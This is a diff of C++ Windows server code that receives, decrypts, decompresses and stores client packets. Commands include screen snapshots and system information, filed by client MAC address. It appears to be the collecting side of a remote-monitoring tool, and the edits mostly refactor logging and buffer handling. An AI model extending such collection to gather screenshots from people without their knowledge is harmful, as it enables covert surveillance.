@@ -26,15 +26,14 @@ int __stdcall DataRecvers::DataRecverProc(LPNETWORKPROCPARAM lpParam) {
 	NETWORKPROCPARAM stParam = *lpParam;
 
 	int iRet = 0;
-	char szShowInfo[1024];
+
 	char szClientInfo[MAX_PATH];
 
 	char* lpBuf = new char[NETWORK_BUF_SIZE + 1024];
 	if (lpBuf == 0)
 	{
 		InetAddrFormatString(stParam, szClientInfo);
-		wsprintfA(szShowInfo, "DataRecverProc new lpbuf error from client:%s\r\n", szClientInfo);
-		WriteLog(szShowInfo);
+		WriteLog("DataRecverProc new lpbuf error from client:%s\r\n", szClientInfo);
 
 		closesocket(stParam.hSockClient);
 		return FALSE;
@@ -47,8 +46,8 @@ int __stdcall DataRecvers::DataRecverProc(LPNETWORKPROCPARAM lpParam) {
 	//The request has been canceled or an error occurred.
 	//Note that if the underlying transport does not support MSG_WAITALL, or if the socket is in a non-blocking mode,
 	//then this call will fail with WSAEOPNOTSUPP
-	int dwPackSize = recv(stParam.hSockClient, lpBuf, NETWORK_BUF_SIZE, 0);
-	if (dwPackSize > sizeof(NETWORKPACKETHEADER))
+	int recvSize = recv(stParam.hSockClient, lpBuf, NETWORK_BUF_SIZE, 0);
+	if (recvSize > 0)
 	{
 		// 		DWORD handler = (DWORD)myeException;
 		// 		__asm {
@@ -59,15 +58,14 @@ int __stdcall DataRecvers::DataRecverProc(LPNETWORKPROCPARAM lpParam) {
 		// 			mov fs : [0], esp;
 		// 		}
 		__try {
-			iRet = DataRecver(stParam, &lpBuf, dwPackSize);
+			iRet = DataRecver(stParam, &lpBuf, recvSize);
 		}
 		__except (1) {
 			WriteLog("DataRecverProc exception\r\n");
 		}
-
 	}
 	else {
-
+		WriteLog("DataRecverProc recv error:%u\r\n", GetLastError());
 	}
 
 	// __SEH_VER__:
@@ -91,15 +89,15 @@ void DataRecvers::myeException(struct _EXCEPTION_RECORD* record, void* f, struct
 }
 
 
-int __stdcall DataRecvers::DataRecver(NETWORKPROCPARAM stParam, char** lpBuf, int dwPackSize)
+int __stdcall DataRecvers::DataRecver(NETWORKPROCPARAM stParam, char** lpBuf, int recvSize)
 {
 	int iRet = 0;
-	char szShowInfo[1024];
 	char szClientInfo[MAX_PATH];
 
 	LPNETWORKPACKETHEADER hdr = (LPNETWORKPACKETHEADER)(*lpBuf);
 
 	DWORD dwCommand = hdr->cmd;
+
 	if (dwCommand != SCREENSNAPSHOT &&
 		dwCommand != ONLINE &&
 		dwCommand != SYSTEMINFO &&
@@ -122,7 +120,7 @@ int __stdcall DataRecvers::DataRecver(NETWORKPROCPARAM stParam, char** lpBuf, in
 		return FALSE;
 	}
 
-	char szuser[MAX_USERNAME_SIZE * 2] = { 0 };
+	char szuser[MAX_USERNAME_SIZE + 4] = { 0 };
 	if (hdr->unique.crypt == DATACRYPT)
 	{
 		xorCrypt(hdr->unique.username, MAX_USERNAME_SIZE, gKey, MAX_USERNAME_SIZE);
@@ -133,7 +131,7 @@ int __stdcall DataRecvers::DataRecver(NETWORKPROCPARAM stParam, char** lpBuf, in
 	{
 		if (checkAccountName(szuser) == FALSE)
 		{
-			WriteLog("get account name error\r\n");
+			WriteLog("check account name %s error\r\n", szuser);
 			return FALSE;
 		}
 
@@ -144,24 +142,21 @@ int __stdcall DataRecvers::DataRecver(NETWORKPROCPARAM stParam, char** lpBuf, in
 	}
 	else {
 		InetAddrFormatString(stParam, szClientInfo);
-		wsprintfA(szShowInfo, "DataRecverProc get user error:%s\r\n", (char*)hdr->unique.username);
-		WriteLog(szShowInfo);
+		WriteLog("DataRecverProc get user error:%s\r\n", (char*)hdr->unique.username);
 		return FALSE;
 	}
-
 
 	iRet = OnlineManager::CheckIfOnlineExist(&hdr->unique, stParam.hSockClient, stParam.stAddrClient, *lpBuf, DATA_THREAD, stParam.dwThreadID);
 
 	int dwDataSize = hdr->packlen;
-	int dwMaxRecvBufSize = NETWORK_BUF_SIZE;
+	int recvBufSize = NETWORK_BUF_SIZE;
 	if (dwDataSize < 0 || dwDataSize >= (MAX_BUF_SIZE - sizeof(NETWORKPACKETHEADER)))
 	{
 		InetAddrFormatString(stParam, szClientInfo);
-		wsprintfA(szShowInfo, "DataRecverProc packet stream size is too big to recv in buffer client:%s\r\n", szClientInfo);
-		WriteLog(szShowInfo);
+		WriteLog("DataRecverProc packet stream size:%u error client:%s\r\n", dwDataSize, szClientInfo);
 		return FALSE;
 	}
-	else if ((dwDataSize > NETWORK_BUF_SIZE - sizeof(NETWORKPACKETHEADER)) && (dwDataSize < MAX_BUF_SIZE - sizeof(NETWORKPACKETHEADER)))
+	else if ((dwDataSize >= NETWORK_BUF_SIZE - sizeof(NETWORKPACKETHEADER)) && (dwDataSize < MAX_BUF_SIZE - sizeof(NETWORKPACKETHEADER)))
 	{
 		char* lpNewBuf = new char[dwDataSize + sizeof(NETWORKPACKETHEADER) + 0x1000];
 		if (lpNewBuf == FALSE)
@@ -169,34 +164,34 @@ int __stdcall DataRecvers::DataRecver(NETWORKPROCPARAM stParam, char** lpBuf, in
 			return FALSE;
 		}
 
-		memcpy(lpNewBuf, *lpBuf, dwPackSize);
+		memcpy(lpNewBuf, *lpBuf, recvSize);
 		delete[] * lpBuf;
 		*lpBuf = lpNewBuf;
-		dwMaxRecvBufSize = dwDataSize + sizeof(NETWORKPACKETHEADER);
+		recvBufSize = dwDataSize + sizeof(NETWORKPACKETHEADER);
 		hdr = (LPNETWORKPACKETHEADER)(*lpBuf);
 	}
 	else {
 		//small packet <= NETWORK_BUF_SIZE
 	}
 
-	while (dwDataSize > (int)(dwPackSize - sizeof(NETWORKPACKETHEADER)))
+	int realSize = recvSize - sizeof(NETWORKPACKETHEADER);
+	while (dwDataSize > realSize)
 	{
-		int dwThirdPackSize = recv(stParam.hSockClient, *lpBuf + dwPackSize, dwMaxRecvBufSize - dwPackSize, 0);
-		if (dwThirdPackSize > 0)
+		int nextSize = recv(stParam.hSockClient, *lpBuf + recvSize, recvBufSize - recvSize, 0);
+		if (nextSize > 0)
 		{
-			dwPackSize += dwThirdPackSize;
+			recvSize += nextSize;
+			realSize += nextSize;
 		}
 		else
 		{
-			if (dwDataSize <= dwPackSize - sizeof(NETWORKPACKETHEADER))
+			if (dwDataSize == recvSize - sizeof(NETWORKPACKETHEADER))
 			{
 				break;
 			}
 			else {
-				int iRet = WSAGetLastError();
 				InetAddrFormatString(stParam, szClientInfo);
-				wsprintfA(szShowInfo, "DataRecverProc recv error code:%u,client:%s\r\n", iRet, szClientInfo);
-				WriteLog(szShowInfo);
+				WriteLog("DataRecverProc recv error code:%u,client:%s\r\n", WSAGetLastError(), szClientInfo);
 				return FALSE;
 			}
 		}
@@ -215,6 +210,7 @@ int __stdcall DataRecvers::DataRecver(NETWORKPROCPARAM stParam, char** lpBuf, in
 		lZlibBufLen = filehdr.origin_len;
 		if (lZlibBufLen > MAX_BUF_SIZE || lZlibBufLen <= 0)
 		{
+			WriteLog("DataRecverProc uncompress buf size:%u error\r\n", lZlibBufLen);
 			return FALSE;
 		}
 
@@ -223,18 +219,15 @@ int __stdcall DataRecvers::DataRecver(NETWORKPROCPARAM stParam, char** lpBuf, in
 		if (lpZlibBuf == 0)
 		{
 			InetAddrFormatString(stParam, szClientInfo);
-			wsprintfA(szShowInfo, "DataRecverProc new unzip buffer error client:%s\r\n", szClientInfo);
-			WriteLog(szShowInfo);
+			WriteLog("DataRecverProc new unzip buffer error client:%s\r\n", szClientInfo);
 			return FALSE;
 		}
 
-		iRet = uncompress((Bytef*)lpZlibBuf, (uLongf*)&lZlibBufLen, (const Bytef*)(*lpBuf + sizeof(NETWORKFILEHDR)),
-			(uLongf)dwDataSize - sizeof(int));
+		iRet = uncompress((Bytef*)lpZlibBuf, (uLongf*)&lZlibBufLen, (const Bytef*)(*lpBuf + sizeof(NETWORKFILEHDR)), (uLongf)dwDataSize - sizeof(int));
 		if (iRet != Z_OK && (lZlibBufLen < filehdr.origin_len))
 		{
 			InetAddrFormatString(stParam, szClientInfo);
-			wsprintfA(szShowInfo, "DataRecverProc unzip error code:%u,client:%s\r\n", iRet, szClientInfo);
-			WriteLog(szShowInfo);
+			WriteLog("DataRecverProc unzip error code:%u,client:%s\r\n", iRet, szClientInfo);
 
 			WriteDataFile("errorpack.log", *lpBuf, 256);
 			delete[]lpZlibBuf;
@@ -265,8 +258,7 @@ int __stdcall DataRecvers::DataRecver(NETWORKPROCPARAM stParam, char** lpBuf, in
 	if (iRet <= 0)
 	{
 		InetAddrFormatString(stParam, szClientInfo);
-		wsprintfA(szShowInfo, "DataRecverProc send recv ok packet error client:%s\r\n", szClientInfo);
-		WriteLog(szShowInfo);
+		WriteLog("DataRecverProc send recv ok packet error client:%s\r\n", szClientInfo);
 		return FALSE;
 	}
 
@@ -295,7 +287,7 @@ int DataRecvers::DataRecverProcess(LPNETWORKPROCPARAM lpParam, LPNETWORKPACKETHE
 #else
 	char szUniqueFormat[] = "%02X_%02X_%02X_%02X_%02X_%02X\\";
 	iRet = wsprintfA(szMacSubDir, szUniqueFormat,
-		stUnique.cMAC[0], stUnique.cMAC[1], stUnique.cMAC[2], stUnique.cMAC[3], stUnique.cMAC[4], stUnique.cMAC[5]);
+		hdr->unique.cMAC[0], hdr->unique.cMAC[1], hdr->unique.cMAC[2], hdr->unique.cMAC[3], hdr->unique.cMAC[4], hdr->unique.cMAC[5]);
 	lstrcpyA(szCurDataDir, szCurrentDir);
 #endif
 	lstrcatA(szCurDataDir, szMacSubDir);
